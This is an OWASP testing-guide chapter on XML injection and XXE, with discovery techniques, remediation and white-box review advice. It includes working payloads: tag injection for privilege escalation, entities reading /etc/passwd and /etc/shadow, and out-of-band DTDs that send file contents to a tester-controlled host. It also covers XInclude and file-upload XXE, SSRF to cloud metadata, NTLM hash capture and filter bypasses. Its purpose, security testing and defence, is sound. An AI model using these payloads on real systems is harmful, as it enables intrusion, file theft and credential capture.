# Testing for XML Injection

|ID          |
|------------|
|WSTG-INPV-07|

## Summary

XML Injection testing is when a tester tries to inject or manipulate an XML document within an application. If the XML parser fails to contextually validate data or is insecurely configured, the test will yield a positive result.

This section describes practical examples of XML Injection. First, an XML-based communication API will be defined and its working principles explained. Then, the discovery method is demonstrated, in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have information about the XML structure, making it possible to inject XML data and tags (Tag Injection), or exploit the parser's configuration to access local and remote resources (XML External Entity / XXE Injection).

## Test Objectives

- Identify XML injection points.
- Assess the types of exploits that can be attained and their severities.

## How to Test

Let's suppose there is a modern web application or web service (such as a SOAP or RESTful API) that accepts XML formatting for user registration.

When a user registers by filling out an HTML form or interacting with a client application, the application sends the user's data in a `POST` request containing an XML payload:

```http
POST /api/addUser HTTP/1.1
Host: www.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>
```

The backend application parses this XML payload and inserts the parsed values into the database or internal state (often augmenting it with server-generated fields such as `userid`). If the application dynamically constructs XML responses or forwards this XML data to another backend system by concatenating strings without proper sanitization, it becomes vulnerable to XML structural injection. Alternatively, if the XML parser itself is insecurely configured, it becomes vulnerable to entity-based attacks (XXE).

### Discovery

The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.

XML metacharacters are:

- Single and Double Quotes (`'` and `"`): When not sanitized, these characters can throw an exception during XML parsing or allow an attacker to prematurely close an attribute. This occurs when the injected quote matches the character used to enclose the attribute value.

For example, let's suppose an application uses single quotes for attributes:

`<node attrib='$inputValue'/>`

If the payload `$inputValue = foo'` is provided, the resulting XML becomes:

`<node attrib='foo''/>`

The resulting XML document is malformed and invalid. The exact same logic applies to double quotes (`"`) if the attribute is enclosed in double quotes (e.g., `<node attrib="$inputValue"/>`).

- Angular parentheses: `>` and `<` - By adding an open or closed angular parenthesis in a user input like the following:

`Username = foo<`

the application will build a new node:

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

but, because of the presence of the open '<', the resulting XML document is invalid.

- Comment tag: `<!--` and `-->` - This sequence of characters is interpreted as the beginning or end of a comment. So by injecting one of them in Username parameter:

`Username = foo<!--`

the application will build a node like the following:

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

which won't be a valid XML sequence.

- Ampersand: `&`- The ampersand is used in the XML syntax to represent entities. The format of an entity is `&symbol;`. An entity is mapped to a character in the Unicode character set.

For example:

`<tagnode>&lt;</tagnode>`

is well formed and valid, and represents the `<` ASCII character.

If `&` is not encoded itself with `&amp;`, it could be used to test XML injection.

In fact, if an input like the following is provided:

`Username = &foo`

a new node will be created:

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>
```

but, again, the document is not valid: `&foo` is not terminated with `;` and the `&foo;` entity is undefined.

- CDATA section delimiters: `<![CDATA[` and `]]>` - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.

For example, if there is the need to represent the string `<foo>` inside a text node, a CDATA section may be used:

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

so that `<foo>` won't be parsed as markup and will be considered as character data.

If a node is created in the following way:

`<username><![CDATA[<$userName]]></username>`

the tester could try to inject the end CDATA string `]]>` in order to try to invalidate the XML document.

`userName = ]]>`

this will become:

`<username><![CDATA[]]>]]></username>`

which is not a valid XML fragment.

Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.

Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.

```xml
<html>
    $HTMLCode
</html>
```

Then, an attacker can provide the following input:

```txt
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```

and obtain the following node:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:

```html
<script>
    alert('XSS')
</script>
```

The result is that the application is vulnerable to XSS.

### Tag Injection

Once the first step is accomplished and the tester maps the XML structure, it is possible to try to inject complete XML tags. This can lead to logic bypasses or privilege escalation if the application uses the parsed XML to make authorization decisions.

Let's consider a scenario where the user's input is concatenated directly into a backend XML request. The application dynamically builds the following XML node to communicate with an internal service:

```xml
<user>
    <username>$username</username>
    <password>$password</password>
    <userid>500</userid>
    <email>$email</email>
</user>
```

By manipulating the $email input field, the tester can inject a closing tag for the current element and start a new one. If the injected input is:

```xml
s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com
```

The backend will generate the following XML:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com</email>
</user>
```

The resulting XML is well-formed. Furthermore, it is likely that the XML parser might process the duplicate `<userid>` tags sequentially and overwrite the initial value (`500`) with the last provided value (`0`, often representing an admin ID). In this case, the tester has successfully injected a user with administrative privileges.

The only problem is that the `userid` and `email` tags appear twice. Often, XML documents are validated against a schema or a Document Type Definition (DTD) and will be rejected if they do not comply with strict cardinality rules.

Let's suppose the backend XML document is strictly specified by a DTD that enforces exactly one `userid` and one `email` tag per user:

```xml
<!DOCTYPE user [
    <!ELEMENT user (username,password,userid,email) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT email (#PCDATA) >
]>
```

In this case, the simple tag injection attack shown above will fail validation before any processing occurs.

However, this defense can be bypassed if the tester controls the values of multiple nodes. By injecting an XML comment start sequence (`<!--`) in one field and an XML comment end sequence (`-->`) in another, the tester can hide the original, server-generated nodes.

For example, the tester provides the following payloads for the inputs:

- Username: tony
- Password: `Un6R34kb!e</password><!--`
- Email: `--><userid>0</userid><email>s4tan@hell.com`

The backend application concatenates these into the XML structure:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password><!--</password>
    <userid>500</userid>
    <email>--><userid>0</userid><email>s4tan@hell.com</email>
</user>
```

The original `<userid>500</userid>` node and the duplicate tags have been successfully commented out, leaving only the injected `<userid>0</userid>`. The document now complies with its strict DTD rules, and the privilege escalation is successful.

### XML External Entity (XXE) Injection

The set of valid XML entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote system. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service, gain unauthorized access to files, scan internal networks, and perform Server-Side Request Forgery (SSRF).

To test for basic XXE vulnerabilities, one can inject a `DOCTYPE` declaration with an external entity into the XML payload:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE user [ 
    <!ELEMENT user ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >
]>
<user>
    <username>&xxe;</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>
```

> Note: The `DOCTYPE` name (`user`) matches the document's actual root element, and the `ELEMENT` declaration refers to that same root element - a mismatched or leftover `DOCTYPE`/`ELEMENT` name from a different example (a common copy-paste mistake when adapting XXE payloads to a new endpoint) will still be tolerated by most non-validating parsers, but keeping them consistent avoids failures against any parser that does perform DTD validation.

This test can trigger a Denial of Service on Unix systems if the XML parser attempts to resolve the entity by reading from `/dev/random`, potentially blocking indefinitely (or consuming significant resources) while trying to substitute the entity value.

Other useful payloads to test for local file disclosure include:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY xxe SYSTEM "file:///etc/shadow" >
<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini" >
<!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >
```

### Blind XXE

In many real-world cases the application does not reflect the value of an external entity back into the HTTP response, so the classic `/etc/passwd`-in-response example above does not directly apply. This is known as **Blind XXE**. The vulnerability is still present and still exploitable, but detection and data exfiltration require out-of-band (OOB) techniques or, when OOB traffic is blocked, an error-based technique.

#### Out-of-Band (OOB) Detection via Parameter Entities

Some parsers or WAF rules block classic general entities (`&xxe;`) but do not restrict **parameter entities**, which can only be referenced inside a DTD and are declared with a `%` instead of `&`. A tester can use a parameter entity to force the target server to make an outbound DNS/HTTP request to an attacker-controlled listener (e.g. Burp Collaborator, `interact.sh`, or a simple netcat/HTTP listener), confirming the injection is live even though nothing is reflected:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/collect">
  %xxe;
]>
<foo>test</foo>
```

A resulting DNS lookup or HTTP hit on the listener confirms that the XML parser resolves external entities, i.e. the application is vulnerable, even with a fully blind response.

#### Out-of-Band Data Exfiltration via a Malicious External DTD

Once OOB interaction is confirmed, the tester can escalate from detection to actual file exfiltration by hosting a malicious external DTD on an attacker-controlled server and chaining parameter entities to smuggle file contents out inside a follow-up request.

Malicious DTD hosted at `http://<tester-controlled-host>/evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<tester-controlled-host>/?data=%file;'>">
%eval;
%exfil;
```

Payload sent to the target application:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

When the target parses this document, it fetches `evil.dtd`, reads the local file into the `%file;` entity, and then makes a second outbound request embedding the file contents as a query parameter - which the tester captures on their listener. Because URLs cannot safely carry arbitrary binary/newline data, this technique is normally limited to single-line, URL-safe text; for binary files or files containing characters that break the URL, testers commonly combine this with a language-specific wrapper (e.g. PHP's `php://filter/convert.base64-encode/resource=`) to base64-encode the file content before exfiltration, where the target stack supports it.

#### Error-Based Exfiltration via a Remote External DTD

This variant still requires the target to make one outbound connection (to fetch the tester's DTD), but unlike the OOB technique above it does not require the attacker's server to receive a *second* request carrying the data - the file contents are leaked back through the application's own error response instead of a network callback. This is useful when outbound connections are allowed but the response body from the second exfiltration request would never reach the tester.

DTD hosted at `http://<tester-controlled-host>/error.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/error.dtd">
  %xxe;
]>
<foo>test</foo>
```

The parser fetches the DTD, attempts to resolve a nonexistent path built from the concatenation of the target file's contents, fails, and - depending on the parser and how verbose the application's error handling is - throws an exception whose message discloses the attempted (and therefore now file-content-bearing) path. If the application returns raw parser errors in its response, this reveals the file contents directly.

#### Error-Based Exfiltration by Repurposing a Local DTD (Zero Outbound Connectivity)

The technique above still needs one outbound fetch. If the target environment truly has no outbound connectivity at all (fully egress-filtered), that is not an option either - and a fully *internal* DOCTYPE normally cannot redefine a parameter entity inside another parameter entity's definition (the XML spec permits this only within external DTDs, and most parsers enforce it).

A reliable workaround is to reference a DTD file that already exists on the target's own local filesystem as the "external" DTD (loaded via `file://` instead of `http://`), and then redefine one of the entities that DTD already declares. Because the reused DTD is technically still "external" from the parser's point of view (even though no network access occurs), the parameter-entity-redefinition trick becomes legal again, and the same error-based leak can be triggered with zero outbound connectivity.

This requires knowing the path of a DTD file that is actually present on the server. Common candidates worth probing for include XML-processing libraries bundled with the application server (application/servlet DTDs shipped inside JARs), and OS-level DTDs such as the GNOME/Yelp documentation DTD on many Linux systems (`/usr/share/yelp/dtd/docbookx.dtd`). A tester can enumerate candidates by submitting a payload that only loads the DTD (without redefining anything) - if the file doesn't exist, the parser throws a file-not-found error, so a wordlist of known DTD paths can be probed one at a time.

Example, assuming `/usr/local/app/schema.dtd` exists on the target and defines an entity called `custom_entity`:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

Note the redefined value of `custom_entity` is written using numeric character references (`&#x25;` for `%`, `&#x26;` for `&`, `&#x27;` for `'`) rather than the literal characters. This is necessary, not stylistic: the replacement text is itself parsed as DTD markup once substituted in, so a literal `%` or `&` inside it would be expanded immediately instead of surviving intact until the redefinition actually takes effect - the numeric references defer that expansion to the correct stage.

This loads the local DTD, overrides its `custom_entity` definition with the error-based exfiltration payload, and then invokes `%local_dtd;` so the parser processes the redefined entity - triggering the same file-content-in-error-message leak as above, but without a single byte of network traffic leaving the server. Tools such as the [dtd-finder](https://github.com/GoSecure/dtd-finder) project maintain lists of known DTD file paths (and can scan a filesystem or container image for DTDs actually present) to speed up this search.

### XInclude Attacks

Sometimes the tester only controls a single value that is later embedded into a larger, server-generated XML document (for example, a form field that ends up inside a backend SOAP request). In that case the tester cannot control or inject a `<!DOCTYPE>` declaration, which rules out the classic entity-based attacks above. **XInclude** is a separate part of the XML specification that lets one XML document pull in content from another source, and it can be triggered from within an ordinary data value - no DOCTYPE required:

```txt
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

If the backend embeds this value into its own XML document unescaped and its parser has XInclude processing enabled, the referenced file's contents are inlined at that point in the resulting document.

### XXE via File Upload

Many applications accept uploads of file formats that are XML-based or that contain embedded XML parts, even when the upload UI only advertises "documents" or "images." These are frequently overlooked as injection points because the tester is not interacting with an obvious XML API.

#### SVG

SVG is an XML-based image format. If an application accepts SVG uploads (or accepts arbitrary image formats and happens to process SVG), a crafted SVG file can carry a DOCTYPE with an external entity that is resolved during rendering/processing, and depending on the workflow, the resolved value may even be rendered visibly inside the generated image:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### Office Open XML Documents (DOCX / XLSX / PPTX)

Modern office formats are ZIP archives containing multiple XML parts. A tester can unzip a legitimate sample file, inject a DOCTYPE/entity into one of the internal XML parts, and re-zip it, then upload it to any feature that parses or converts the document server-side (preview generation, text extraction, format conversion, etc.).

Example: editing `word/document.xml` inside a `.docx`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

The same approach applies to `xl/workbook.xml` in `.xlsx` files and to the equivalent parts in `.pptx` files. This is a useful check for any endpoint that ingests office documents for indexing, thumbnailing, or conversion - such pipelines are often built on older or loosely-configured XML libraries even when the main application's own API layer has been hardened.

#### Other XML-Based Formats

Testers should also consider less obvious XML-based formats that an application might accept as input, including XLIFF (translation exchange files), RSS/Atom feeds, SOAP envelopes, and any custom import format documented as "XML" or "based on XML." Any of these can carry the same DOCTYPE/entity or XInclude payloads shown above.

### Escalating Impact: SSRF and Credential Capture

XXE is not limited to local file disclosure - the same external-entity mechanism is a request-forgery primitive, so testers should assess impact beyond `/etc/passwd`:

- **SSRF to cloud metadata services.** In cloud-hosted targets, pointing an entity at the instance metadata endpoint (e.g. `http://169.254.169.254/...` on AWS) can disclose temporary credentials - but note that AWS's current default, IMDSv2, requires a `PUT` request plus a custom header to obtain a session token before any `GET` will succeed, and XXE-driven SSRF (via a `SYSTEM` identifier) can typically only issue a plain `GET`. In practice this means a classic XXE->metadata credential grab now mostly only works against older or explicitly misconfigured instances that still have IMDSv1 enabled (`HttpTokens` not set to `required`) - check the instance's metadata options rather than assuming the endpoint is exploitable by default. Azure's and GCP's equivalent metadata endpoints similarly require specific headers (`Metadata: true` / `Metadata-Flavor: Google`) that a bare `SYSTEM "http://..."` entity cannot set, for the same reason. Even where direct credential theft is blocked, reaching the metadata endpoint at all is still useful for confirming SSRF and probing which cloud the target runs on.
- **Internal network/port scanning.** Differences in response time or error messages between reachable and unreachable internal hosts/ports can be used to map internal network topology through the vulnerable server.
- **Credential capture via UNC paths (Windows).** On Windows-hosted parsers, pointing an entity at a UNC path (`file://///attacker-ip/share/x`) can cause the server to attempt SMB authentication to a tester-controlled listener, leaking the service account's NTLM hash for offline cracking.

These impacts should be reflected in how a finding's severity is scored, per the Test Objectives above - a blind, file-read-only XXE and an XXE that yields cloud credentials are very different findings even though the injection point is identical.

### Filter and WAF Bypass Techniques

If straightforward `<!DOCTYPE` payloads are being blocked or stripped, the following variations are worth trying before concluding the application is not vulnerable:

- **Encoding the payload:** Some parsers accept alternative input encodings (e.g. UTF-7) that do not contain the literal byte sequences a filter is matching on, but are still decoded and parsed as XML by the underlying library before any filter logic runs. Re-encoding the entire payload can bypass naive signature-based filters that only look for plaintext `<!DOCTYPE` or `<!ENTITY`.
- **Data URIs (`data:`):** Where the parser's protocol handling permits it, a base64-encoded payload can be smuggled in via a `data:text/plain;base64,...` parameter entity, keeping the actual DTD content out of the request in plaintext form.
- **Alternate protocol wrappers instead of `file://`:** On PHP-based stacks, wrappers such as `php://filter/convert.base64-encode/resource=` both bypass naive `file://`-string filters and solve the separate problem of exfiltrating binary/multi-line content (see the OOB exfiltration note above). On Java-based stacks, the `jar:` protocol can be used to reach files inside a ZIP/JAR archive, including one fetched from a remote URL, and is useful when direct `file://` access is blocked but archive-based access is not.
- **Splitting the trust between two encodings:** A small number of parsers will decode numeric HTML character references inside an entity value before re-parsing it as a DTD fragment; where this applies, expressing the blocked keywords as numeric character references can slip past a filter that only recognizes the literal string.

As always with filter bypasses, confirm the underlying parser/version actually exhibits the behavior being relied on rather than assuming any of the above works universally - these are leads to test, not guaranteed bypasses.

### A Note on Modern Parser Defaults

Many current XML parsing libraries and frameworks now ship with external entity resolution disabled by default, or provide a documented "secure processing" flag that testers should confirm is actually in use (this does **not** mean XXE testing can be skipped - see the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)). In practice, exploitable XXE today is most often found where:

- A parser was configured securely for the application's primary API, but a secondary code path (file upload processing, document conversion, report generation, legacy SOAP endpoint) uses a different, unhardened parser instance.
- DTDs are disabled but XInclude processing was left enabled (these are typically separate configuration flags).
- A third-party library or dependency embeds its own XML parsing with insecure defaults.
- Older or custom-built parsers (embedded devices, legacy Java/C stacks) are still in use.

Testers should therefore test every XML-consuming code path independently rather than assuming that securing one API endpoint secures the whole application.

## White-Box Testing

When reviewing source code, check if the XML parsers are securely configured to disable `DOCTYPE`, external DTDs, and external parameter entities.

For comprehensive secure configuration snippets across all languages, refer to the [OWASP XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

### Java

The following Java APIs may be vulnerable to XXE if not configured properly:

- `javax.xml.parsers.DocumentBuilder` / `DocumentBuilderFactory`
- `javax.xml.parsers.SAXParser` / `SAXParserFactory`
- `javax.xml.stream.XMLInputFactory`
- `javax.xml.transform.TransformerFactory` / `SAXTransformerFactory`
- `org.xml.sax.XMLReader` / `EntityResolver`
- `org.dom4j.io.SAXReader`
- `org.jdom2.input.SAXBuilder`
- `Xerces`: `DOMParser`, `SAXParser`, `XMLParser`

> **Note:** Third-party libraries that process XML-based formats (such as Apache POI for OOXML documents) can also introduce XXE and XEE vulnerabilities. When reviewing code, look for historical vulnerability keywords such as `XSSFExportToXml` or insecure OPC SAX configurations. Always verify the library version against known security advisories (e.g., [Apache POI CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-22766/Apache-POI.html)) rather than assuming they are safe by default.

### C / C++

The following source code keywords may indicate vulnerable implementations:

- **libxml2:** `xmlCtxtReadMemory`, `xmlCtxtUseOptions`, `xmlParseInNodeContext`, `xmlReadDoc`, `xmlReadFd`, `xmlReadFile`, `xmlReadIO`, `xmlReadMemory`, `xmlCtxtReadDoc`, `xmlCtxtReadFd`, `xmlCtxtReadFile`, `xmlCtxtReadIO`
- **libxerces-c:** `XercesDOMParser`, `SAXParser`, `SAX2XMLReader`

### Python

The following packages and functions should be reviewed:

- `xml.etree.ElementTree` and `xml.dom.minidom`: While these do not expand external entities by default in current CPython versions, they can still be susceptible to entity-expansion-style Denial of Service (DoS) and other edge cases.
- `lxml`: Check if the parser is explicitly instantiated with `resolve_entities=True` (and `no_network=False`), which enables XXE.
- **Recommendation:** `defusedxml` is the standard drop-in replacement for standard-library XML modules to uniformly mitigate XXE and DoS risks.

### Node.js / JavaScript

Look for legacy or loosely configured libraries:

- `libxmljs`: External entity substitution is off by default; look for an explicit `{ noent: true }` option, which re-enables it.
- `xml2js`: This library relies on pure JavaScript parsers like `sax-js` under the hood. While it does not resolve external entities by default, it can be vulnerable to DoS attacks. Check if the `strict` option is explicitly set to `false`.
- `xml2json`: This module uses `node-expat` (C/C++ bindings to the Expat parser) under the hood. While Expat is generally safe from classic file-disclosure XXE out of the box, it can be susceptible to XML Entity Expansion (DoS) if not explicitly restricted.
- `xmldom`: Review for any explicit entity-resolution configurations, as its default behaviors and capabilities have historically varied across versions.

## Remediation

The most reliable fix for XXE-class issues is to remove the parser's ability to resolve external resources at all, rather than trying to filter or sanitize XML input. General principles, in order of priority:

- **Disable DTD processing entirely** wherever the application does not have a genuine business need for it. Most application XML (API payloads, config uploads, form submissions converted to XML) never legitimately needs a DOCTYPE.
- If DTDs cannot be disabled outright, **disable resolution of external general and parameter entities**, and **disable XInclude processing** - these are usually separate flags from the DTD toggle, so turning one off does not guarantee the other is off.
- Prefer parser APIs/configuration flags described as "secure processing" where available, but verify what that flag actually covers for the specific parser/version in use rather than assuming it disables everything above.
- Apply this configuration to **every** parser instantiation in the codebase and its dependencies, not just the main API layer - file upload handling, document conversion/preview generation, import/export jobs, SOAP clients, and third-party libraries each create their own parser instances and must be checked independently.
- Where external entities are a genuine requirement, implement a strict **allow-list** of permitted URIs/schemes rather than relying on a **block-list** (deny-list) for dangerous protocols like `file://`, `ftp://`, etc.
- Apply defense in depth: run XML-parsing processes with least privilege (no access to sensitive files, no outbound network access where not required), and keep XML libraries patched, since parser-level defaults and known bypasses change between versions.

Quick reference by ecosystem (verify against current documentation for the exact library/version in use, since defaults have changed over time and vary by library):

- **Java**: set `DocumentBuilderFactory`/`SAXParserFactory`/`XMLInputFactory`/`TransformerFactory` (and `Xerces`-based parsers) to disable DOCTYPE declarations, external general/parameter entities, and XInclude.
- **.NET**: use `XmlReaderSettings` with `DtdProcessing` set to `Prohibit` and `XmlResolver` set to `null` (or a restrictive custom resolver).
- **Python**: prefer a hardened parsing library (e.g. `defusedxml`) instead of the standard library's XML modules directly; for `lxml`, explicitly leave `resolve_entities` at its safe default (or set it to `False`) and avoid enabling network access on the parser.
- **PHP**: on PHP 8.0+, `libxml_disable_entity_loader()` is deprecated and largely unnecessary - PHP now requires libxml >= 2.9.0, which disables external entity substitution by default, so a stock `DOMDocument`/`SimpleXML`/`libxml`-based parse on a current PHP version is not exploitable via the classic entity route unless the code explicitly re-enables it (e.g. via `LIBXML_NOENT` combined with `LIBXML_DTDLOAD`). Testers should therefore check for explicit opt-back-in flags on modern PHP rather than assuming the framework needs a disable call; on PHP < 8.0 with older libxml, the disable call is still required. Either way, treat file-upload/document-conversion features that call third-party libraries separately, since those may bundle their own, differently-configured parser.
- **Node.js**: for `libxmljs`-based parsing, never set `noent: true` on untrusted input; prefer omitting the option (or setting it `false`) and pair with `nonet: true` to also block network-based entity resolution.
- **C/C++ (libxml2)**: avoid the options that enable network/entity loading (e.g. `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD`) unless explicitly required.

For authoritative, parser-specific configuration snippets, defer to the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), which is maintained separately and updated as parser behavior changes.

## Tools

- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
- [dtd-finder](https://github.com/GoSecure/dtd-finder) - a list of known local DTD file paths, plus a scanner that can enumerate DTDs present on a filesystem or inside a container/Docker image, useful for the local-DTD-repurposing technique above.

## References

- [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "XXE (XML eXternal Entity) attack"](https://www.securityfocus.com/archive/1/297714)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy – XML External Entity (XXE) Injection](https://portswigger.net/web-security/xxe)
- [PortSwigger Web Security Academy – Blind XXE](https://portswigger.net/web-security/xxe/blind)
- [HackTricks – XXE / XEE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
